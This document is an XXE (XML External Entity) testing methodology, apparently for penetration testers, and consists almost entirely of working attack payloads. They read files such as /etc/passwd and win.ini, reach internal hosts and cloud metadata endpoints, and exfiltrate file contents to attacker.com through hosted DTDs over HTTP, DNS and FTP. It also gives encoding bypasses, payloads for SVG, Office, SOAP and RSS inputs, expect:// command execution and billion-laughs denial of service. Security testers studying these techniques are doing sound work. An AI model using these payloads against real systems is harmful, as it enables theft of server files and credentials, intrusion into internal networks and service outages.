# XML External Entity (XXE) Testing Methodology

## Quick Reference

**Basic XXE (file read):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Blind XXE (out-of-band):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<root>&xxe;</root>
```

---

## XXE Types

### Classic XXE
Entity value reflected in response - can read files directly.

### Blind XXE
No direct output - must exfiltrate via out-of-band channels.

### Error-Based XXE
Exfiltrate data via error messages.

---

## Basic XXE Payloads

### File Disclosure (Unix)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### File Disclosure (Windows)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### Directory Listing (Java)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/">
]>
<root>&xxe;</root>
```

### SSRF via XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

---

## Blind XXE Techniques

### Out-of-Band via HTTP

**Malicious DTD (hosted on attacker server):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

### Out-of-Band via DNS

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe.attacker.com/">
]>
<root>&xxe;</root>
```

### Out-of-Band via FTP

**Malicious DTD:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;
```

### Error-Based Exfiltration

**Malicious DTD:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

This causes an error containing the file contents.

---

## Parameter Entity Techniques

### Basic Parameter Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

### Nested Parameter Entities

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

---

## Protocol Support by Parser

| Protocol | Java | .NET | PHP | libxml2 |
|----------|------|------|-----|---------|
| file:// | Yes | Yes | Yes | Yes |
| http:// | Yes | Yes | Yes | Yes |
| https:// | Yes | Yes | Yes | Yes |
| ftp:// | Yes | Yes | Yes | Yes |
| gopher:// | No | No | Yes* | No |
| jar:// | Yes | No | No | No |
| netdoc:// | Yes | No | No | No |
| php:// | No | No | Yes | No |
| phar:// | No | No | Yes | No |
| expect:// | No | No | Yes* | No |

*If enabled

---

## Parser-Specific Payloads

### Java

**Using jar protocol:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/test.txt">
]>
<root>&xxe;</root>
```

**Using netdoc:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
]>
<root>&xxe;</root>
```

### PHP

**Using php://filter:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

**Using expect (if enabled):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

### .NET

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

---

## Bypass Techniques

### Alternative Encodings

**UTF-16:**
```xml
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**UTF-7:**
```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-
  +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-root+AD4-+ACY-xxe;+ADw-/root+AD4-
```

### HTML Entities

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:&#x2f;&#x2f;&#x2f;etc/passwd">
]>
<root>&xxe;</root>
```

### CDATA Wrapper (for special chars)

**Malicious DTD:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % eval "<!ENTITY &#x25; all '%start;%file;%end;'>">
%eval;
```

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&all;</root>
```

---

## XXE in Different Contexts

### SOAP

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>
```

### SVG

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### XLSX (Office Documents)

XLSX files are ZIP archives containing XML. Modify `xl/workbook.xml`:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook>
  <sheets>
    <sheet name="&xxe;"/>
  </sheets>
</workbook>
```

### DOCX

Modify `word/document.xml` in DOCX archive.

### PDF (XFA)

If PDF contains XFA forms:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xfa:data>&xxe;</xfa:data>
```

### RSS/Atom Feeds

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
  </channel>
</rss>
```

---

## XInclude Attacks

When you can't control DTD but can inject into XML body:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## DoS via XXE

### Billion Laughs (Entity Expansion)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<root>&lol5;</root>
```

### Quadratic Blowup

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY a "aaaaaaaaaa...">  <!-- Long string -->
]>
<root>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;...</root>
```

---

## Common Injection Points

- XML APIs
- SOAP web services
- SAML authentication
- File uploads (SVG, DOCX, XLSX)
- Configuration files
- RSS/Atom feed parsers
- Sitemap processors

---

## Verification Checklist

1. **Identify XML processing:**
   - [ ] Content-Type: application/xml
   - [ ] File upload accepting XML/SVG/Office docs
   - [ ] SOAP/SAML endpoints

2. **Test basic XXE:**
   - [ ] External entity file read
   - [ ] External entity HTTP request

3. **Test blind XXE:**
   - [ ] Out-of-band via HTTP
   - [ ] Out-of-band via DNS
   - [ ] Error-based exfiltration

4. **Confirm exploitation:**
   - [ ] File contents retrieved
   - [ ] Internal network access
   - [ ] Callback received

5. **Document evidence:**
   - [ ] File contents or callback proof
   - [ ] Working payload
   - [ ] Affected endpoint
